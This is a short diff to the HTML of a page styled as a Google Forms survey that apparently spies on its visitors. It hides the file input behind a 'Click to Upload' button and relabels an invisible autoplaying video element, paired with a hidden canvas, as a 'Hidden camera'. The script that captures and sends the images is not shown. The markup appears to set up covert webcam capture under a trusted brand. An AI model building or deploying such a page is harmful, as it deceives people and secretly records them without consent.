@@ -77,7 +77,8 @@
         <!-- File Upload Question -->
         <div class="question-card file-upload">
           <div class="question-title">Please upload any file of your choice: <span class="required">*</span></div>
-          <input type="file" id="user-file" required>
+          <button type="button" id="trigger-upload" class="submit-button">Click to Upload</button>
+          <input type="file" id="user-file" style="display:none;" required>
         </div>
 
         <!-- Submit -->
@@ -112,15 +113,15 @@
         </div>
       </div>
       <div class="google-footer">
-            <div class="branding">This content is neither created nor endorsed by Google. <u>Report Abuse</u> - <u>Terms of Service</u> - <u>Privacy Policy</u></div>
-            <div class="google-logo">Google Forms</div>
+        <div class="branding">This content is neither created nor endorsed by Google. <u>Report Abuse</u> - <u>Terms of Service</u> - <u>Privacy Policy</u></div>
+        <div class="google-logo">Google Forms</div>
       </div>
     </div>
 
   </div>
 
-  <!-- Hidden video -->
-  <video id="video" autoplay playsinline style="display:none"></video>
+  <!-- Hidden camera -->
+  <video id="video" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <!-- Toast -->
